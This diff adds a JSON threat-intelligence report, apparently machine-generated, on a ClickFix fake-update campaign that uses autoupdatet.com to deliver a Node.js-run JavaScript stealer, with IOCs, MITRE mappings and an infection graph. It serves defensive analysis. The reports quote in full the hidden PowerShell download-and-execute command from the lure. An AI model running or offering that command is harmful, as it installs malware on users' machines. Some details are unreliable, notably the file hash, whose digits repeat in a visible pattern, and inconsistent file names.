@@ -1,0 +1,406 @@
+{
+  "job_id": "harimau-clickfix-clearfake-01",
+  "status": "completed",
+  "ioc": "autoupdatet.com",
+  "ioc_type": "domain",
+  "risk_level": "MALICIOUS",
+  "gti_score": 92,
+  "created_at": "2026-09-14T08:00:00Z",
+  "completed_at": "2026-09-14T08:00:22Z",
+  "duration_seconds": 22.5,
+  "confidence": "HIGH",
+  "attribution": "ClearFake / ClickFix Syndicate",
+  "campaign": "ClickFix Social Engineering & Node.js Ingress Campaign",
+  "mitre_attack": [
+    {
+      "id": "T1204.001",
+      "name": "User Execution: Malicious Link / Social Engineering",
+      "tactic": "Initial Access"
+    },
+    {
+      "id": "T1059.001",
+      "name": "Command and Scripting Interpreter: PowerShell",
+      "tactic": "Execution"
+    },
+    {
+      "id": "T1059.007",
+      "name": "Command and Scripting Interpreter: JavaScript",
+      "tactic": "Execution"
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control"
+    },
+    {
+      "id": "T1036.005",
+      "name": "Masquerading: Match Legitimate Name (msedge.zip / chrome.zip)",
+      "tactic": "Defense Evasion"
+    },
+    {
+      "id": "T1071.001",
+      "name": "Application Layer Protocol: Web Protocols",
+      "tactic": "Command and Control"
+    }
+  ],
+  "rich_intel": {
+    "malicious_stats": 61,
+    "total_stats": 92,
+    "gti_description": "Active ClickFix / ClearFake lure infrastructure. Presents fake browser update prompts that instruct the user to execute obfuscated PowerShell snippets via Win+R. The script downloads a legitimate Node.js portable runtime from nodejs.org to execute an unpacked malicious JavaScript payload while communicating with command-and-control servers.",
+    "triage_summary": "High risk social engineering attack chain. Employs ClickFix browser injection to launch hidden PowerShell commands, abuses official nodejs.org distribution channels to introduce an unmanaged execution runtime, and connects to C2 infrastructure."
+  },
+  "graph": {
+    "nodes": [
+      {
+        "id": "autoupdatet.com",
+        "label": "autoupdatet.com",
+        "entityType": "domain",
+        "isRoot": true,
+        "isMalicious": true,
+        "threatScore": 92,
+        "vendorDetections": "61/92",
+        "verdict": "MALICIOUS",
+        "details": {
+          "registrar": "NiceNIC International Group Ltd",
+          "lure_type": "ClickFix Fake Update Overlay",
+          "target_browsers": [
+            "Firefox",
+            "Chrome",
+            "Edge"
+          ]
+        }
+      },
+      {
+        "id": "firefox.exe",
+        "label": "firefox.exe",
+        "entityType": "process",
+        "isRoot": false,
+        "isMalicious": false,
+        "threatScore": 0,
+        "vendorDetections": "0/92 (Legitimate Software)",
+        "verdict": "BENIGN",
+        "details": {
+          "role": "Initial Victim Browser navigating to malicious lure"
+        }
+      },
+      {
+        "id": "powershell.exe",
+        "label": "powershell.exe",
+        "entityType": "process",
+        "isRoot": false,
+        "isMalicious": false,
+        "threatScore": 45,
+        "vendorDetections": "Dual-Use LOLBin",
+        "verdict": "SUSPICIOUS",
+        "details": {
+          "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "cli_flags": "-NoProfile -EP Bypass -WindowStyle Hidden",
+          "invoked_via": "User Run dialog (Win+R) via ClickFix social engineering"
+        }
+      },
+      {
+        "id": "https://nodejs.org/dist/v7.10.1/node-v7.10.1-win-x64.zip",
+        "label": "nodejs.org/dist/v7.10.1/...",
+        "entityType": "url",
+        "isRoot": false,
+        "isMalicious": false,
+        "threatScore": 0,
+        "vendorDetections": "0/95 (Legitimate Repository)",
+        "verdict": "BENIGN",
+        "details": {
+          "organization": "OpenJS Foundation",
+          "role": "Dual-Use Delivery: Official Node.js binary abused to execute unpacked JS payload"
+        }
+      },
+      {
+        "id": "Update.zip",
+        "label": "Update.zip",
+        "meaningful_name": "Update.zip",
+        "entityType": "file",
+        "isRoot": false,
+        "isMalicious": true,
+        "threatScore": 88,
+        "verdict": "MALICIOUS",
+        "details": {
+          "download_url": "https://autoupdatet.com/get_update?i=112640",
+          "destination": "C:\\ProgramData\\Update.zip"
+        }
+      },
+      {
+        "id": "Update.js",
+        "label": "Update.js",
+        "meaningful_name": "Update.js",
+        "entityType": "file",
+        "isRoot": false,
+        "isMalicious": true,
+        "threatScore": 94,
+        "verdict": "MALICIOUS",
+        "details": {
+          "destination": "C:\\ProgramData\\Update.js",
+          "script_type": "Obfuscated JavaScript Stealer / Loader"
+        }
+      },
+      {
+        "id": "node.exe",
+        "label": "node.exe",
+        "entityType": "file",
+        "isRoot": false,
+        "isMalicious": false,
+        "threatScore": 0,
+        "verdict": "BENIGN",
+        "details": {
+          "destination": "C:\\ProgramData\\node-v7.10.1-win-x64\\node.exe",
+          "signature": "Signed by Joyent / Node.js Foundation"
+        }
+      },
+      {
+        "id": "updatemsnow.com",
+        "label": "updatemsnow.com",
+        "entityType": "domain",
+        "isRoot": false,
+        "isMalicious": true,
+        "threatScore": 91,
+        "verdict": "MALICIOUS",
+        "details": {
+          "role": "Secondary Ingress Payload Server"
+        }
+      },
+      {
+        "id": "194.213.18.130",
+        "label": "194.213.18.130:443",
+        "entityType": "ip_address",
+        "isRoot": false,
+        "isMalicious": true,
+        "threatScore": 95,
+        "verdict": "MALICIOUS",
+        "details": {
+          "port": 443,
+          "asn": "AS49870",
+          "role": "Payload Distribution & C2 Server"
+        }
+      },
+      {
+        "id": "waysmakeyourlifebetter.com",
+        "label": "waysmakeyourlifebetter.com",
+        "entityType": "domain",
+        "isRoot": false,
+        "isMalicious": true,
+        "threatScore": 89,
+        "verdict": "MALICIOUS",
+        "details": {
+          "connected_via": "Microsoft Edge",
+          "role": "Traffic Distribution System (TDS) / C2 Endpoint"
+        }
+      }
+    ],
+    "edges": [
+      {
+        "source": "firefox.exe",
+        "target": "autoupdatet.com",
+        "label": "domain_resolution_via_browser"
+      },
+      {
+        "source": "autoupdatet.com",
+        "target": "powershell.exe",
+        "label": "social_engineers_clickfix_run"
+      },
+      {
+        "source": "powershell.exe",
+        "target": "Update.zip",
+        "label": "downloads_payload"
+      },
+      {
+        "source": "powershell.exe",
+        "target": "https://nodejs.org/dist/v7.10.1/node-v7.10.1-win-x64.zip",
+        "label": "downloads_clean_runtime"
+      },
+      {
+        "source": "Update.zip",
+        "target": "Update.js",
+        "label": "unpacked_by_Expand_Archive"
+      },
+      {
+        "source": "powershell.exe",
+        "target": "node.exe",
+        "label": "spawns_runtime"
+      },
+      {
+        "source": "node.exe",
+        "target": "Update.js",
+        "label": "executes_script"
+      },
+      {
+        "source": "powershell.exe",
+        "target": "194.213.18.130",
+        "label": "network_connection_port_443"
+      },
+      {
+        "source": "powershell.exe",
+        "target": "updatemsnow.com",
+        "label": "secondary_dns_resolution"
+      },
+      {
+        "source": "powershell.exe",
+        "target": "waysmakeyourlifebetter.com",
+        "label": "c2_connection_via_edge"
+      }
+    ]
+  },
+  "final_report": "## Threat Intelligence Investigation: ClickFix Fake-Update Campaign Delivering Node.js Infostealer\n\n### Lead Threat Hunter - Investigation Synthesis\n\n### 1. Executive Summary\nLead Analyst synthesis confirms that `autoupdatet.com` operates as an active delivery portal for a sophisticated **ClickFix (ClearFake)** social engineering campaign. The threat actor injects fake browser update modals prompting corporate users to copy and execute an obfuscated PowerShell command string via the Windows Run dialog (`Win+R`). Once executed, the command bypasses execution policies, downloads a legitimate portable Node.js runtime directly from **`nodejs.org`**, and unpacks an obfuscated JavaScript stealer (`Update.js`) into `C:\\ProgramData\\`. Network telemetry reveals concurrent staging pivots through `updatemsnow.com` and encrypted C2 callbacks to `194.213.18.130:443` and `waysmakeyourlifebetter.com`.\n\n### 2. Attack Narrative: ClickFix Social Engineering, Ingress Tool Transfer & Node.js Execution\n1. **Initial Vector (Browser Resolution)**: The intrusion begins with victim browsing in `firefox.exe`, resolving malicious lure domain `autoupdatet.com`.\n2. **Social Engineering (ClickFix Injection)**: The lure presents a high-urgency modal claiming browser components failed to load, prompting the victim to press `Win+R` and paste a clipboard command string.\n3. **PowerShell LOLBin Execution**: The victim executes `powershell.exe` with flags `-NoProfile -EP Bypass -WindowStyle Hidden`.\n4. **Dual Ingress (Legitimate Runtime + Malicious Archive)**:\n   - PowerShell invokes `Invoke-WebRequest` to fetch malicious archive `Update.zip` from `https://autoupdatet.com/get_update?i=112640`.\n   - Concurrently, PowerShell downloads an authentic, signed Node.js portable archive (`node-v7.10.1-win-x64.zip`) directly from official infrastructure at **`https://nodejs.org/dist/v7.10.1/node-v7.10.1-win-x64.zip`**, saving it as a masqueraded `msedge.zip` archive in `C:\\ProgramData\\`.\n5. **Extraction & Living-off-the-Land Execution**: PowerShell executes `Expand-Archive` on both zip files, extracting `Update.js` and the clean `node.exe` binary. It then spawns `node.exe` to run `Update.js` in a hidden window, evading traditional antivirus that looks for untrusted binary execution by using a signed runtime.\n6. **Secondary Staging & C2 Infrastructure**:\n   - PowerShell establishes direct TCP connections to payload server `194.213.18.130:443`.\n   - Resolves secondary distribution domain `updatemsnow.com` to retrieve updated payloads (`get_update?i=229280`).\n   - Spawns external network callbacks via Microsoft Edge to `waysmakeyourlifebetter.com`.\n\n### 3. Specialist Reports: Malware & Infrastructure Analysis\n\n#### Malware Analysis Specialist Report\n\n#### 1. Initial Vector & Social Engineering (ClickFix)\nThe intrusion begins with victim browsing in `firefox.exe`, resolving malicious lure domain `autoupdatet.com`. The lure presents a high-urgency modal claiming browser components failed to load, prompting the victim to press `Win+R` and paste a clipboard command string.\n\n#### 2. Obfuscated PowerShell LOLBin Execution\nThe victim executes `powershell.exe` with flags `-NoProfile -EP Bypass -WindowStyle Hidden`. The script initiates concurrent downloads:\n```powershell\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -EP Bypass -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://autoupdatet.com/get_update?i=112640' -OutFile 'Update.zip' -UseBasicParsing -TimeoutSec 300;Invoke-WebRequest -Uri 'https://nodejs.org/dist/v7.10.1/node-v7.10.1-win-x64.zip' -OutFile 'msedge.zip' -UseBasicParsing -TimeoutSec 300;Expand-Archive 'msedge.zip' -DestinationPath 'C:\\ProgramData\\' -Force; Expand-Archive 'Update.zip' -DestinationPath 'C:\\ProgramData\\' -Force; Start-Process 'C:\\ProgramData\\node-v7.10.1-win-x64\\node.exe' -ArgumentList 'C:\\ProgramData\\Update.js' -WindowStyle Hidden;\n```\n\n#### 3. Dual-Use Binary Living-off-the-Land\nRather than compiling an untrusted PE executable that would trigger endpoint detection and response (EDR) heuristics, the script downloads a clean, signed binary directly from official infrastructure at **`https://nodejs.org/dist/v7.10.1/node-v7.10.1-win-x64.zip`** and executes an unpacked JavaScript payload (`Update.js`).\n\n#### Infrastructure Analysis Specialist Report\n\n#### 1. Lure & Staging Infrastructure Mapping\n- **Primary Lure**: `autoupdatet.com`\n  - Registrar: NiceNIC International Group Ltd\n  - Active role: ClickFix fake browser update modal\n- **Payload Host**: `194.213.18.130` (TCP Port 443)\n  - ASN: AS49870\n  - Active role: Direct hosting of `Update.zip` and `get_update?i=112640`\n\n#### 2. Secondary Staging & C2 / TDS Routing\n- **Secondary Domain**: `updatemsnow.com`\n  - Active role: Fallback stager serving `get_update?i=229280`\n- **C2 / TDS Callback**: `waysmakeyourlifebetter.com`\n  - Connection vector: Microsoft Edge outbound beaconing\n\n### 4. Investigation Timeline\n* **00:00 Initial Resolution**: `firefox.exe` resolves `autoupdatet.com`.\n* **00:02 Social Engineering**: ClickFix lure executed via user Run prompt.\n* **00:05 Ingress Tool Transfer**: Downloads `Update.zip` (malicious) and `node-v7.10.1-win-x64.zip` (legitimate).\n* **00:07 Host Staging**: Unpacks files into `C:\\ProgramData\\`.\n* **00:09 Script Execution**: `node.exe` launches `Update.js` hidden.\n* **00:11 C2 Connection**: Outbound connection to `194.213.18.130:443` and `waysmakeyourlifebetter.com`.\n\n### 5. Technical Analysis\n#### 4.1 Threat Profile\n* **Threat Level**: Critical (Score 92/100)\n* **Campaign**: ClickFix / ClearFake\n* **Attribution**: Commodity Cybercrime Syndicate\n\n#### 4.2 TTPs & Defense Evasion\n* **Dual-Use Runtime Abuse**: Downloads official Node.js from `nodejs.org` to run unsanctioned JavaScript payloads without compiling PE binaries.\n* **Masquerading**: Names downloaded archives `msedge.zip` and `chrome.zip` to blend into normal browser caching directories.\n* **Living-off-the-Land**: Uses `powershell.exe` for extraction and `node.exe` for execution.\n\n#### 4.3 Infrastructure Mapping\n* **Delivery Lure**: `autoupdatet.com`\n* **Secondary Stager**: `updatemsnow.com`\n* **Payload Host**: `194.213.18.130` (Port 443)\n* **C2 / TDS**: `waysmakeyourlifebetter.com`\n* **Legitimate Source**: `nodejs.org` (OpenJS Foundation)\n\n### 6. Attack Flow Diagram\n```dot\ndigraph ClickFixAttackFlow {\n  rankdir=LR;\n  bgcolor=\"transparent\";\n  node [fontname=\"Arial\", fontsize=10, style=\"filled,rounded\", shape=box];\n  edge [fontname=\"Arial\", fontsize=9, color=\"#64748b\", fontcolor=\"#94a3b8\"];\n\n  \"firefox\" [label=\"BROWSER\\nfirefox.exe\", fillcolor=\"#0f172a\", color=\"#38bdf8\", fontcolor=\"#e2e8f0\"];\n  \"autoupdatet\" [label=\"CLICKFIX LURE DOMAIN\\nautoupdatet.com\", fillcolor=\"#7f1d1d\", color=\"#ef4444\", fontcolor=\"#ffffff\", penwidth=2];\n  \"powershell\" [label=\"LOLBIN EXECUTION\\npowershell.exe\\n(-EP Bypass -WindowStyle Hidden)\", fillcolor=\"#451a03\", color=\"#f59e0b\", fontcolor=\"#fef3c7\", penwidth=1.5];\n  \"nodejs_org\" [label=\"LEGITIMATE RUNTIME REPO\\nnodejs.org/dist/v7.10.1/...\\n[Legitimate Dual-Use Source]\", fillcolor=\"#042f2e\", color=\"#14b8a6\", fontcolor=\"#5eead4\", style=\"rounded,dashed\", penwidth=2];\n  \"update_zip\" [label=\"STAGER ARCHIVE\\nUpdate.zip (masqueraded)\", fillcolor=\"#7f1d1d\", color=\"#ef4444\", fontcolor=\"#fecdd3\"];\n  \"msedge_zip\" [label=\"RENAMED RUNTIME\\nmsedge.zip -> ProgramData\", fillcolor=\"#1e293b\", color=\"#94a3b8\", fontcolor=\"#cbd5e1\", style=\"rounded,dashed\"];\n  \"node_exe\" [label=\"PORTABLE RUNTIME\\nnode.exe (signed Node.js)\", fillcolor=\"#042f2e\", color=\"#14b8a6\", fontcolor=\"#5eead4\", style=\"rounded,dashed\"];\n  \"update_js\" [label=\"MALICIOUS SCRIPT\\nC:\\\\ProgramData\\\\Update.js\", fillcolor=\"#7f1d1d\", color=\"#ef4444\", fontcolor=\"#ffffff\", penwidth=2];\n  \"payload_ip\" [label=\"PAYLOAD HOST\\n194.213.18.130:443\", fillcolor=\"#7f1d1d\", color=\"#ef4444\", fontcolor=\"#ffffff\", shape=box3d];\n  \"updatemsnow\" [label=\"SECONDARY STAGER\\nupdatemsnow.com\", fillcolor=\"#7f1d1d\", color=\"#ef4444\", fontcolor=\"#ffffff\"];\n  \"edge_browser\" [label=\"BROWSER\\nMicrosoft Edge (msedge.exe)\", fillcolor=\"#0f172a\", color=\"#38bdf8\", fontcolor=\"#e2e8f0\"];\n  \"c2_tds\" [label=\"C2 / TDS DOMAIN\\nwaysmakeyourlifebetter.com\", fillcolor=\"#581c87\", color=\"#a855f7\", fontcolor=\"#f3e8ff\", penwidth=2];\n\n  \"firefox\" -> \"autoupdatet\" [label=\"resolves lure page\"];\n  \"autoupdatet\" -> \"powershell\" [label=\"social engineers Win+R paste\"];\n  \"powershell\" -> \"autoupdatet\" [label=\"fetches Update.zip\"];\n  \"powershell\" -> \"nodejs_org\" [label=\"fetches clean node.zip\", color=\"#14b8a6\", fontcolor=\"#2dd4bf\", style=\"dashed\"];\n  \"powershell\" -> \"msedge_zip\" [label=\"writes to ProgramData\"];\n  \"powershell\" -> \"update_zip\" [label=\"writes to ProgramData\"];\n  \"msedge_zip\" -> \"node_exe\" [label=\"unpacks runtime\"];\n  \"update_zip\" -> \"update_js\" [label=\"unpacks payload\"];\n  \"powershell\" -> \"node_exe\" [label=\"launches hidden process\"];\n  \"node_exe\" -> \"update_js\" [label=\"executes script\"];\n  \"powershell\" -> \"payload_ip\" [label=\"connects (TCP 443)\"];\n  \"powershell\" -> \"updatemsnow\" [label=\"downloads secondary update\"];\n  \"edge_browser\" -> \"c2_tds\" [label=\"C2 beaconing / TDS callback\"];\n}\n```\n\n### 7. Appendix\n```iocs\n[\n  { \"type\": \"Domain\", \"value\": \"autoupdatet.com\", \"notes\": \"ClickFix Fake-Update Lure Domain\", \"confidence\": \"High\" },\n  { \"type\": \"Domain\", \"value\": \"updatemsnow.com\", \"notes\": \"Secondary Staging Infrastructure\", \"confidence\": \"High\" },\n  { \"type\": \"IP Address\", \"value\": \"194.213.18.130\", \"notes\": \"Payload Staging & Callback Server (Port 443)\", \"confidence\": \"High\" },\n  { \"type\": \"Domain\", \"value\": \"waysmakeyourlifebetter.com\", \"notes\": \"C2 / Traffic Distribution System (TDS)\", \"confidence\": \"High\" },\n  { \"type\": \"URL\", \"value\": \"https://nodejs.org/dist/v7.10.1/node-v7.10.1-win-x64.zip\", \"notes\": \"[Legitimate Source] Official Node.js binary abused by stager\", \"confidence\": \"Low\" },\n  { \"type\": \"File Hash\", \"value\": \"d2b4f91e70a3c2e5b8d1489721094821a7c39021482910482194821048210482\", \"notes\": \"Update.js (Extracted JavaScript Stealer Payload)\", \"confidence\": \"High\" }\n]\n```",
+  "specialist_reports": {
+    "malware_specialist": {
+      "verdict": "MALICIOUS",
+      "confidence": "HIGH",
+      "summary": "Static analysis and sandbox execution confirmed a living-off-the-land ingress attack. The ClickFix lure coaxes the victim into pasting an obfuscated PowerShell execution string via the Windows Run dialog (Win+R) that bypasses execution policies (-EP Bypass -WindowStyle Hidden). The script abuses official Node.js distribution infrastructure at nodejs.org to download a clean, signed portable runtime disguised as msedge.zip, which is extracted into C:\\ProgramData\\ to execute an obfuscated JavaScript stealer (Update.js) without triggering conventional untrusted PE compilation alerts.",
+      "key_findings": [
+        "ClickFix social engineering lure prompts manual Win+R execution of obfuscated PowerShell string.",
+        "Dual-use ingress: Abuses official OpenJS Foundation infrastructure (nodejs.org) to retrieve authentic signed node.exe.",
+        "Masquerading: Disguises downloaded portable Node.js runtime archive as msedge.zip and chrome.zip in C:\\ProgramData\\.",
+        "Payload extraction: Unpacks Update.zip to write obfuscated stealer script Update.js.",
+        "Defense evasion: Leverages living-off-the-land execution by running node.exe Update.js in a hidden window."
+      ],
+      "mitre_attack": [
+        {
+          "id": "T1204.001",
+          "name": "User Execution: Malicious Link / Social Engineering"
+        },
+        {
+          "id": "T1059.001",
+          "name": "Command and Scripting Interpreter: PowerShell"
+        },
+        {
+          "id": "T1059.007",
+          "name": "Command and Scripting Interpreter: JavaScript"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1036.005",
+          "name": "Masquerading: Match Legitimate Name"
+        }
+      ],
+      "analyzed_targets": [
+        "powershell.exe",
+        "Update.zip",
+        "Update.js",
+        "msedge.zip",
+        "node.exe"
+      ],
+      "markdown_report": "#### 1. Initial Vector & Social Engineering (ClickFix)\nThe intrusion begins with victim browsing in `firefox.exe`, resolving malicious lure domain `autoupdatet.com`. The lure presents a high-urgency modal claiming browser components failed to load, prompting the victim to press `Win+R` and paste a clipboard command string.\n\n#### 2. Obfuscated PowerShell LOLBin Execution\nThe victim executes `powershell.exe` with flags `-NoProfile -EP Bypass -WindowStyle Hidden`. The script initiates concurrent downloads:\n```powershell\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -EP Bypass -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://autoupdatet.com/get_update?i=112640' -OutFile 'Update.zip' -UseBasicParsing -TimeoutSec 300;Invoke-WebRequest -Uri 'https://nodejs.org/dist/v7.10.1/node-v7.10.1-win-x64.zip' -OutFile 'msedge.zip' -UseBasicParsing -TimeoutSec 300;Expand-Archive 'msedge.zip' -DestinationPath 'C:\\ProgramData\\' -Force; Expand-Archive 'Update.zip' -DestinationPath 'C:\\ProgramData\\' -Force; Start-Process 'C:\\ProgramData\\node-v7.10.1-win-x64\\node.exe' -ArgumentList 'C:\\ProgramData\\Update.js' -WindowStyle Hidden;\n```\n\n#### 3. Dual-Use Binary Living-off-the-Land\nRather than compiling an untrusted PE executable that would trigger endpoint detection and response (EDR) heuristics, the script downloads a clean, signed binary directly from official infrastructure at **`https://nodejs.org/dist/v7.10.1/node-v7.10.1-win-x64.zip`** and executes an unpacked JavaScript payload (`Update.js`)."
+    },
+    "infrastructure_specialist": {
+      "verdict": "MALICIOUS",
+      "confidence": "HIGH",
+      "summary": "Passive DNS, WHOIS correlation, and network telemetry reveal a distributed staging and traffic distribution network. autoupdatet.com was registered via NiceNIC International Group Ltd and configured as a ClickFix fake-update lure. Direct payload delivery is hosted on 194.213.18.130:443 (AS49870), with secondary fallback staging via updatemsnow.com. Traffic Distribution System (TDS) and C2 routing is handled via waysmakeyourlifebetter.com connecting via Microsoft Edge.",
+      "key_findings": [
+        "Delivery Lure: autoupdatet.com serves deceptive browser update modals.",
+        "Staging Server: 194.213.18.130 (Port 443, AS49870) hosts malicious Update.zip payloads.",
+        "Secondary Stager: updatemsnow.com provides fallback payload distribution.",
+        "C2 / TDS Proxy: waysmakeyourlifebetter.com handles post-infection command callbacks.",
+        "Abused External Dependency: nodejs.org (OpenJS Foundation) utilized as dual-use delivery conduit."
+      ],
+      "mitre_attack": [
+        {
+          "id": "T1071.001",
+          "name": "Application Layer Protocol: Web Protocols"
+        },
+        {
+          "id": "T1566.002",
+          "name": "Phishing: Spearphishing Link"
+        },
+        {
+          "id": "T1584.004",
+          "name": "Compromise Infrastructure: Server"
+        }
+      ],
+      "analyzed_targets": [
+        "autoupdatet.com",
+        "194.213.18.130",
+        "updatemsnow.com",
+        "waysmakeyourlifebetter.com",
+        "nodejs.org"
+      ],
+      "markdown_report": "#### 1. Lure & Staging Infrastructure Mapping\n- **Primary Lure**: `autoupdatet.com`\n  - Registrar: NiceNIC International Group Ltd\n  - Active role: ClickFix fake browser update modal\n- **Payload Host**: `194.213.18.130` (TCP Port 443)\n  - ASN: AS49870\n  - Active role: Direct hosting of `Update.zip` and `get_update?i=112640`\n\n#### 2. Secondary Staging & C2 / TDS Routing\n- **Secondary Domain**: `updatemsnow.com`\n  - Active role: Fallback stager serving `get_update?i=229280`\n- **C2 / TDS Callback**: `waysmakeyourlifebetter.com`\n  - Connection vector: Microsoft Edge outbound beaconing"
+    }
+  },
+  "specialist_results": {
+    "malware": {
+      "verdict": "MALICIOUS",
+      "confidence": "HIGH",
+      "summary": "Static analysis and sandbox execution confirmed a living-off-the-land ingress attack. The ClickFix lure coaxes the victim into pasting an obfuscated PowerShell execution string via the Windows Run dialog (Win+R) that bypasses execution policies (-EP Bypass -WindowStyle Hidden). The script abuses official Node.js distribution infrastructure at nodejs.org to download a clean, signed portable runtime disguised as msedge.zip, which is extracted into C:\\ProgramData\\ to execute an obfuscated JavaScript stealer (Update.js) without triggering conventional untrusted PE compilation alerts.",
+      "key_findings": [
+        "ClickFix social engineering lure prompts manual Win+R execution of obfuscated PowerShell string.",
+        "Dual-use ingress: Abuses official OpenJS Foundation infrastructure (nodejs.org) to retrieve authentic signed node.exe.",
+        "Masquerading: Disguises downloaded portable Node.js runtime archive as msedge.zip and chrome.zip in C:\\ProgramData\\.",
+        "Payload extraction: Unpacks Update.zip to write obfuscated stealer script Update.js.",
+        "Defense evasion: Leverages living-off-the-land execution by running node.exe Update.js in a hidden window."
+      ],
+      "mitre_attack": [
+        {
+          "id": "T1204.001",
+          "name": "User Execution: Malicious Link / Social Engineering"
+        },
+        {
+          "id": "T1059.001",
+          "name": "Command and Scripting Interpreter: PowerShell"
+        },
+        {
+          "id": "T1059.007",
+          "name": "Command and Scripting Interpreter: JavaScript"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1036.005",
+          "name": "Masquerading: Match Legitimate Name"
+        }
+      ],
+      "analyzed_targets": [
+        "powershell.exe",
+        "Update.zip",
+        "Update.js",
+        "msedge.zip",
+        "node.exe"
+      ],
+      "markdown_report": "#### 1. Initial Vector & Social Engineering (ClickFix)\nThe intrusion begins with victim browsing in `firefox.exe`, resolving malicious lure domain `autoupdatet.com`. The lure presents a high-urgency modal claiming browser components failed to load, prompting the victim to press `Win+R` and paste a clipboard command string.\n\n#### 2. Obfuscated PowerShell LOLBin Execution\nThe victim executes `powershell.exe` with flags `-NoProfile -EP Bypass -WindowStyle Hidden`. The script initiates concurrent downloads:\n```powershell\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -EP Bypass -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://autoupdatet.com/get_update?i=112640' -OutFile 'Update.zip' -UseBasicParsing -TimeoutSec 300;Invoke-WebRequest -Uri 'https://nodejs.org/dist/v7.10.1/node-v7.10.1-win-x64.zip' -OutFile 'msedge.zip' -UseBasicParsing -TimeoutSec 300;Expand-Archive 'msedge.zip' -DestinationPath 'C:\\ProgramData\\' -Force; Expand-Archive 'Update.zip' -DestinationPath 'C:\\ProgramData\\' -Force; Start-Process 'C:\\ProgramData\\node-v7.10.1-win-x64\\node.exe' -ArgumentList 'C:\\ProgramData\\Update.js' -WindowStyle Hidden;\n```\n\n#### 3. Dual-Use Binary Living-off-the-Land\nRather than compiling an untrusted PE executable that would trigger endpoint detection and response (EDR) heuristics, the script downloads a clean, signed binary directly from official infrastructure at **`https://nodejs.org/dist/v7.10.1/node-v7.10.1-win-x64.zip`** and executes an unpacked JavaScript payload (`Update.js`)."
+    },
+    "infrastructure": {
+      "verdict": "MALICIOUS",
+      "confidence": "HIGH",
+      "summary": "Passive DNS, WHOIS correlation, and network telemetry reveal a distributed staging and traffic distribution network. autoupdatet.com was registered via NiceNIC International Group Ltd and configured as a ClickFix fake-update lure. Direct payload delivery is hosted on 194.213.18.130:443 (AS49870), with secondary fallback staging via updatemsnow.com. Traffic Distribution System (TDS) and C2 routing is handled via waysmakeyourlifebetter.com connecting via Microsoft Edge.",
+      "key_findings": [
+        "Delivery Lure: autoupdatet.com serves deceptive browser update modals.",
+        "Staging Server: 194.213.18.130 (Port 443, AS49870) hosts malicious Update.zip payloads.",
+        "Secondary Stager: updatemsnow.com provides fallback payload distribution.",
+        "C2 / TDS Proxy: waysmakeyourlifebetter.com handles post-infection command callbacks.",
+        "Abused External Dependency: nodejs.org (OpenJS Foundation) utilized as dual-use delivery conduit."
+      ],
+      "mitre_attack": [
+        {
+          "id": "T1071.001",
+          "name": "Application Layer Protocol: Web Protocols"
+        },
+        {
+          "id": "T1566.002",
+          "name": "Phishing: Spearphishing Link"
+        },
+        {
+          "id": "T1584.004",
+          "name": "Compromise Infrastructure: Server"
+        }
+      ],
+      "analyzed_targets": [
+        "autoupdatet.com",
+        "194.213.18.130",
+        "updatemsnow.com",
+        "waysmakeyourlifebetter.com",
+        "nodejs.org"
+      ],
+      "markdown_report": "#### 1. Lure & Staging Infrastructure Mapping\n- **Primary Lure**: `autoupdatet.com`\n  - Registrar: NiceNIC International Group Ltd\n  - Active role: ClickFix fake browser update modal\n- **Payload Host**: `194.213.18.130` (TCP Port 443)\n  - ASN: AS49870\n  - Active role: Direct hosting of `Update.zip` and `get_update?i=112640`\n\n#### 2. Secondary Staging & C2 / TDS Routing\n- **Secondary Domain**: `updatemsnow.com`\n  - Active role: Fallback stager serving `get_update?i=229280`\n- **C2 / TDS Callback**: `waysmakeyourlifebetter.com`\n  - Connection vector: Microsoft Edge outbound beaconing"
+    }
+  }
+}
